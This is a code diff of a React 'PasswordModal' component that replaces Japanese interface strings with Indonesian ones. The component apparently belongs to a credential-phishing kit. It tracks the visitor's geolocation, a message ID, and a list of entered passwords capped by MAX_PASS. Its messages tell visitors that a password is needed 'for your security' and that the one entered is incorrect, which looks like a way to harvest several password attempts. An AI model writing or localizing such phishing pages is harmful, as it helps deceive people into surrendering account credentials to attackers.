@@ -30,13 +30,13 @@ const PasswordModal = ({ nextStep }) => {
     const { geoInfo, messageId, baseMessage, passwords, addPassword, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
-    // Tất cả text tiếng Nhật
+    // Tất cả text tiếng Indonesia
     const texts = {
-        'For your security, you must enter your password to continue.': 'セキュリティのため、続行するにはパスワードを入力してください。',
-        'Password': 'パスワード',
-        "The password that you've entered is incorrect.": '入力したパスワードが正しくありません。',
-        'Continue': '続ける',
-        'Forgot your password?': 'パスワードをお忘れですか？'
+        'For your security, you must enter your password to continue.': 'Untuk keamanan Anda, Anda harus memasukkan kata sandi untuk melanjutkan.',
+        'Password': 'Kata Sandi',
+        "The password that you've entered is incorrect.": 'Kata sandi yang Anda masukkan tidak benar.',
+        'Continue': 'Lanjutkan',
+        'Forgot your password?': 'Lupa kata sandi Anda?'
     };
 
     const t = (text) => {
